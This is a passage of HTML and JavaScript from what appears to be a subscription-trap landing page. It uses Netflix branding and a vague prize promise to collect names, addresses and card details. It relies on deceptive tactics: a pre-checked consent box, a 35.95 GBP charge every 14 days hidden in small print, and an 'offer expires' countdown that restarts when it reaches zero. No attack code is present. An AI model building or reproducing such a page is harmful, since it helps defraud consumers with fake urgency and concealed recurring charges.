                        </div>
                    </div>
                    </div>
                    <div id="step2">
                    <div class="row form-title">
                        <div class="col-12">
                        <h4> Create your account </h4>
                        </div>
                        <div class="col-12">
                        <p> Enjoy the biggest blockbusters, boldest stories &amp; exclusive originals. </p>
                        </div>
                    </div>
                    <div class="row">
                        <div class="col-6 max-width-col-49 col-md-6 contentEmail">
                        <label for="firstname" class="sr-only form-label p-first-name__label contentInput">First name <span class="text-danger">*</span>
                        </label>
                        <input class="form-control p-first-name__input contentInput" id="firstname" required="required" placeholder="First name" name="firstname" type="text">
                        </div>
                        <div class="col-6 max-width-col-49 col-md-6 contentEmail">
                        <label for="lastname" class="sr-only form-label">Last name <span class="text-danger">*</span>
                        </label>
                        <input class="form-control p-last-name__input contentInput" id="lastname" required="required" placeholder="Last name" name="lastname" type="text">
                        </div>
                    </div>
                    <div class="row">
                        <div class="col-12 max-width-col-98 col-md-12 contentEmail">
                        <label for="adress" class="sr-only form-label">Address <span class="text-danger">*</span>
                        </label>
                        <input class="form-control p-address__input contentInput" id="address" required="required" placeholder="Address" name="address" type="text">
                        </div>
                    </div>
                    <div class="row">
                        <div class="col-6 max-width-col-49 col-md-6 contentEmail">
                        <label class="sr-only" for="zip">Post code <span class="text-danger">*</span>
                        </label>
                        <input class="form-control p-postal-code__zip ui-autocomplete-input contentInput" id="zip" maxlength="10" required="required" placeholder="Post code" name="zip" type="text" autocomplete="off">
                        </div>
                        <div class="col-6 max-width-col-49 col-md-6 contentEmail">
                        <label class="sr-only" for="city">City <span class="text-danger">*</span>
                        </label>
                        <input class="form-control p-postal-code__city contentInput" id="city" required="required" placeholder="City" name="city" type="text">
                        </div>
                        <div class="col-12"></div>
                    </div>
                    <div class="row">
                        <div class="col-12 max-width-col-98 col-md-12">
                        <label for="gender">Gender <span class="text-danger">*</span>
                        </label>
                        <select class="form-control p-gender__input" id="gender" required="required" name="gender">
                            <option value="m">Male</option>
                            <option value="f">Female</option>
                        </select>
                        </div>
                    </div>
                    <div class="row submit-row">
                        <div class="submit-col">
                        <div class="cta-btn">
                            <button type="submit" class="submit2">Continue</button>
                        </div>
                        </div>
                    </div>
                    <div class="row">
                        <div class="col-12 max-width-col-98 col-md-12 mt-1">
                        <div class="">
                            <!--<h3>
                                            Terms & Conditions <span class="text-danger">*</span></h3>-->
                            <label class="p-email__label">
                            <p>
                                <input class="p-acceptterms__input" id="acceptterms" required="required" checked="checked" name="acceptterms" type="checkbox" value="1"> Yes, I am 18 years or older and accept the processing of my personal data in order to receive personalized marketing material in accordance with the <a class="thickbox" id="terms_link" href="http://support.bumfuzzles.co.uk/terms" onclick="window.open(this.href, 'child', 'height='+window.outerHeight+', width=960, scrollbars=yes'); return false;" target="_blank" title="Terms">terms</a> and <a class="thickbox" id="terms_link" href="http://support.bumfuzzles.co.uk/privacy" onclick="window.open(this.href, 'child', 'height='+window.outerHeight+', width=960, scrollbars=yes'); return false;" target="_blank" title="Privacy Policy">privacy policy</a>. The membership will begin immediately and the membership will automatically continue and charge a fee of 35.95 GBP every 14 Days until cancelled. I can cancel at any time.
                            </p>
                            </label>
                        </div>
                        </div>
                    </div>
                    </div>
                    <h2 class="mt-5" style="color:white"> This offer expires in: <span id="counter" style="color: #ff2a2a; font-weight:300">02:12</span>
                    </h2>
                    <h6>Last possible sign up date will be December 21, 2024.</h6>
                    <h6>* This campaign is brought to you by Bumfuzzles.co.uk. <br> Note: Every 20 participant will receive a Netflix™ </h6>
                </div>
                </div>
            </div>
        </div>
    </div>

    <div class="mid-section col-12 pt-5">
        <img src="./img/imagesList.png" id="prod2">
    </div>
    <div class="type-3 pt-5">
        <div class="descr col-lg-8 col-md-8 col-sm-8 col-xs-12 text-center">
            <p class="line text-center">Multiple Viewership</p>
            <p class="line-desc text-center">
            Add up to 5 personal profiles for both adults and children - with hand-picked content. Watch what you want, where you want with high quality always. Download content offline and watch across multiple platforms.
            </p>
            <img class="text-center" src="./img/devices.jpg" id="backgr">
        </div>
    </div>
    <div class="type-4 col-12 py-5 d-flex justify-content-center">
     <div class="bottom-section d-block col-lg-5 col-xs-12 col-sm-12">
         <h3 class="line">
           Everything You Love
         </h3>
         <p class="line-desc">
           All in One Place.
The biggest blockbusters, the boldest stories, and the unforgettable classics that made us who we are. Enjoy iconic Sony, Columbia Pictures,  Netflix Originals plus much more, together for the very first time.
         </p>
     </div>
 </div>

 <div class="container-fluid" id="footer">



    <div class="container">
          <div class="row " style="position:relative;top:15px">
                    <div class="col-12 col-md-2 col-md-offset-5 text-center">
                <!--<div class="dropdown">
                      <button class="btn languageBtn" type="button" data-toggle="dropdown">
                       <img src="/img/languages/en.png" alt="English language">
                      
                      <i class="fas fa-sort-down" style="color:#fff"></i>
                      </button>
                      <ul class="dropdown-menu">
                                                  <li>
                                <a href="https://c.shopbetter24.co.uk/language/6">
                                    <img src="/img/languages/en.png" alt="English language">
                                  English
                                </a>
                            </li>
                                              </ul>
                </div>-->
                  </div>
                </div>
     <div class="row p-terms p-terms--emailandaddress" style="margin-top:20px">
        <div class="col-md-12">
            <div class="terms">
    <div class="row">
        <div class="col-xs-12 col-sm-12 col-md-6 col-md-offset-3 terms--main">
            <h6 class="terms__header">FAST SHIPPING - FREE EXCHANGES</h6>
            <p class="terms__body">Free shipping on all the orders - no exceptions. Exchanges are always free, and returns are always easy. In doubt of what to order? Don't worry, our concepts are easy to navigate through any category and our Personal Shoppers are ready to assist you, all day every day.
<br>
*Please note: This is a Sign Up -offer and every 20 participant will receive a Netflix™.</p>
        </div>
    </div>
    <div class="row terms--secondary">
        <div class="col-xs-12 col-sm-6 col-md-6 terms--left">
            <h6 class="terms__header">EXPLORE NEW MONTHLY ITEMS</h6>
            <p class="terms__body">We acquire large selections of quality products directly from the largest suppliers, with a guarantee of authenticity, around the world. All items are sent directly to our warehouse. This way we avoid expensive intermediaries and can therefore push the price, all the way down.
We quality check all products and give you a 100% guarantee of authenticity.</p>
        </div>
        <div class="col-xs-12 col-sm-6 col-md-6 terms--right">
            <h6 class="terms__header">EXCEPTIONAL MEMBERSHIP VALUE</h6>
            <p class="terms__body">You are saving up to 15% on retail pricing with your membership discount and we are talking about more than 165.000 products and counting! We offer loyalty coins, extra credits, no commitments, priority products, birthday gifts, exclusive merchandise and much more.
Memberships will automatically be renewed at full price (35.95 GBP/14 days), unless the membership is cancelled before the period expires.</p>
        </div>
    </div>
    <div class="row credit-cards">
                                <div class="col-3  col-xs-3 col-sm-3 col-md-3 credit-card credit-card--verified">
                <a href="http://www.visaeurope.com/en/cardholders/verified_by_visa.aspx" target="_blank" class="credit-card__link credit-card__link--verified">
                    <img src="./img/visa123.png">
                </a>
            </div>
                                <div class="col-3  col-xs-3 col-sm-3 col-md-3 credit-card credit-card--securecode">
                <a href="http://www.mastercard.co.uk/securecode.html" target="_blank" class="credit-card__link credit-card__link--securecode">
                    <img src="./img/mastercard123.png">
                </a>
            </div>
                                <div class="col-3  col-xs-3 col-sm-3 col-md-3 credit-card credit-card--visa">
                <a href="http://www.visaeurope.com/en/visa_europe.aspx" target="_blank" class="credit-card__link credit-card__link--visa">
                    <img src="./img/visa-verifed123.png">
                </a>
            </div>
                                <div class="col-3  col-xs-3 col-sm-3 col-md-3 credit-card credit-card--mastercard">
                <a href="http://www.mastercard.co.uk/" target="_blank" class="credit-card__link credit-card__link--mastercard">
                    <img src="./img/mastercardsecure123.png">
                </a>
            </div>
            </div>
</div>
        </div>
      
    </div>

    <div class="row p-footer p-footer--emailandaddress">
        <div class="col-md-12">
            <img src="data:image/gif;base64,R0lGODlhAQABAAD/ACwAAAAAAQABAAACADs=" class="p-footer__image">
        </div>
    </div>

    </div>
</div>

 

    <script src="./Galiemas.com28_files/bootstrap.min.js" integrity="" crossorigin="anonymous"></script>
    <script src="./Galiemas.com28_files/jquery-ui.min.js" integrity="" crossorigin="anonymous"></script>

    <!--Add for Credit Card -->
    <script src="./js/ccards.js?version=7"></script>

    <script type="text/javascript" src="./main.js?<?php echo date('U'); ?>"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/imask/3.4.0/imask.min.js"></script>
    <script src="<?php echo GEO_PATH; ?>/card_mask.js"></script>

    <script src="./Galiemas.com28_files/scripts.js?version=3"></script>


    <script>
        var param_lang;
        var $modalLang = $('#modal-lang');
        var $langBtn = $('#lang_btn');

        $langBtn.html($(".lang_selector[data-value=" + param_lang + "]").html());

        var closeMenu = function() {
            $modalLang.removeClass('active');
            setTimeout(function() {
                $modalLang.css('display', 'none');
            }, 000);
        }
        var openMenu = function() {
            $modalLang.css('display', 'block');
            setTimeout(function() {
                $modalLang.addClass('active');
            }, 000);
        }

        //Dropwdown Lang Selection
        $(".lang_selector").click(function(e) {

            var lang = $(this).attr('data-value');
            var el = $(this).html();
            _t.lang(lang);
            e.preventDefault();
            e.stopPropagation();

            closeMenu();

            $langBtn.html(el);

            var url = new URI(window.location.href);
            url.setQuery("lang", lang);

            window.history.pushState({
                href: url
            }, '', url);
        });

        $('html').on('click', function(e) {
            var t = $(e.target);
            if (!(t.is($modalLang)) && !(t.is('#lang_btn')) && $modalLang.hasClass('active')) {
                closeMenu();
            }
        });

        //Lang Btn
        $('#lang_btn').click(function() {

            if ($modalLang.hasClass('active')) {

                closeMenu();

            } else {
                openMenu();
            }

        });
    </script>

    <script>
        if (document.getElementsByTagName("HTML")[0].getAttribute("dir") == 'rtl') {

            function myFunction(x) {
                if (x.matches) {


                    document.getElementById("foter").setAttribute("dir", "ltr");
                    document.querySelector(".paso2").setAttribute("dir", "ltr");

                } else {
                    document.getElementById("foter").setAttribute("dir", "ltr");
                    document.querySelector(".paso2").setAttribute("dir", "ltr");


                }
            }

            var x = window.matchMedia("(max-width: 575.98px)")
            myFunction(x)
            x.addListener(myFunction)

        }


        $(".chose-img").on('click', function(event) {

            $(".product").removeClass("mostrar");
            $(".product").removeClass("ocultar");
            $(".product").removeClass("text-focus-in");

            if ($(this).hasClass("green")) {
                $("#green").addClass("mostrar");
                $("#phanton").addClass("ocultar");
                $("#lavender").addClass("ocultar");
                $("#cream").addClass("ocultar");
            }

            if ($(this).hasClass("phanton")) {
                $("#green").addClass("ocultar");
                $("#phanton").addClass("mostrar");
                $("#lavender").addClass("ocultar");
                $("#cream").addClass("ocultar");
            }

            if ($(this).hasClass("lavender")) {
                $("#green").addClass("ocultar");
                $("#phanton").addClass("ocultar");
                $("#lavender").addClass("mostrar");
                $("#cream").addClass("ocultar");
            }

            if ($(this).hasClass("cream")) {
                $("#green").addClass("ocultar");
                $("#phanton").addClass("ocultar");
                $("#lavender").addClass("ocultar");
                $("#cream").addClass("mostrar");
            }


        });


    </script>



    <script>
        $('#btn-3, #btn-2, #btn-1').click(function() {
            scrolltoform();
        });

        $(window).on("load", function() {

            $(window).scroll(function() {

                var windowBottom = $(this).scrollTop() + $(this).innerHeight();
                $(".elfade").each(function() {
                    /* Check the location of each desired element */
                    var objectBottom = $(this).offset().top + $(this).outerHeight();

                    /* If the element is completely within bounds of the window, fade it in */
                    if (objectBottom < windowBottom) { //object comes into view (scrolling down)
                        if ($(this).css("opacity") == 0) {
                            $(this).fadeTo(500, 1);
                        }
                    } else { //object goes out of view (scrolling up)
                        if ($(this).css("opacity") == 1) {
                            $(this).fadeTo(500, 0);
                        }
                    }
                });
            }).scroll(); //invoke scroll-handler on page-load
        });

        $(window).scroll(function(event) {
            var scroll = $(window).scrollTop();
            if (scroll > 100) {
                $('.bottomlink').fadeIn().css('display', 'inline');
            } else if (scroll < 100) {
                $('.bottomlink').fadeOut("slow", function() {
                    $(this).css({
                        display: "none"
                    });
                });
            }
        });

        $(window).scroll(function(event) {
            var scroll = $(window).scrollTop();
            if (scroll > 100) {
                $('.bottomlink').fadeIn().css('display', 'inline');
            } else if (scroll < 100) {
                $('.bottomlink').fadeOut("slow", function() {
                    $(this).css({
                        display: "none"
                    });
                });
            }
        });


        function scrolltoform() {
            $('html, body').animate({
                scrollTop: $(".p-body--emailandaddress").offset().top - 240
            }, 1000);
        }


        $(".sub_but").click(function() {
            scrolltoform();
        });
        $(".bottomlink").click(function() {
            scrolltoform();
        });
        $(".sub_but_claim").click(function() {
            scrolltoform();
        });
        $(".sub_but_blue").click(function() {
            scrolltoform();
        });
        $(".sub_but_purple").click(function() {
            scrolltoform();
        });
        window.onload = function () {
            var tenMinutes = 60 * 10,
                display = document.querySelector('#counter');
            startTimer(tenMinutes, display);
        };
      


        function validateEmailStep(){
            var emailInput = $("#email");
            var testEmail = /^[A-Z0-9._%+-]+@([A-Z0-9-]+\.)+[A-Z]{2,4}$/i;

            if (testEmail.test(emailInput.val())) {
                    $("#step1").fadeOut(600, function(){
                $("#step2").fadeIn(600); 
                });
            }

            else {
                console.log('fill out email');
                }
        };

        $("#nextbut").click(function(){
            console.log('butbut');
            validateEmailStep();
            console.log('valstepok');
        });

     
        // COUNTER 

        function startTimer(duration, display) {
            var start = Date.now(),
                diff,
                minutes,
                seconds;
            function timer() {
                // get the number of seconds that have elapsed since 
                // startTimer() was called
                diff = duration - (((Date.now() - start) / 1000) | 0);

                // does the same job as parseInt truncates the float
                minutes = (diff / 60) | 0;
                seconds = (diff % 60) | 0;

                minutes = minutes < 10 ? "0" + minutes : minutes;
                seconds = seconds < 10 ? "0" + seconds : seconds;

                display.textContent = minutes + ":" + seconds; 

                if (diff <= 0) {
                    // add one second so that the count down starts at the full duration
                    // example 05:00 not 04:59
                    start = Date.now() + 1000;
                }
            };
            // we don't want to wait a full second before the timer starts
            timer();
            setInterval(timer, 1000);
        }


       

    </script>
    <script>
            // JavaScript para el carrusel
            let scrollLeft = 0;
            const carousel = document.querySelector('.carousel');
            const images = document.querySelectorAll('.carousel img');

            // Función para avanzar al siguiente elemento en el carrusel
            function nextSlide() {
                scrollLeft += carousel.offsetWidth;
                if (scrollLeft >= carousel.scrollWidth) {
                    scrollLeft = 0;
                }
                carousel.scrollTo({
                    left: scrollLeft,
                    behavior: 'smooth'
                });
            }

            // Cambiar automáticamente las imágenes cada 3 segundos
            setInterval(nextSlide, 3000);
        </script>

    <script>
        //confeti
        function createConfeti() {
            const confetiContainer = document.getElementById('confeti-container');

            const colors = ['#831010', '#da7676', '#da7676', '#da7676', '#831010']; // Puedes personalizar los colores del confeti
        
            for (let i = 0; i < 100; i++) {
                const confeti = document.createElement('div');
                confeti.classList.add('confeti');
                confeti.style.backgroundColor = colors[Math.floor(Math.random() * colors.length)];
                confeti.style.left = Math.random() * 100 + '%';
                confeti.style.animationDelay = Math.random() * 3 + 's';
                confetiContainer.appendChild(confeti);
            }
        }

        createConfeti(); // Llama a la función para generar el confeti al cargar la página
    </script>


</body>

</html>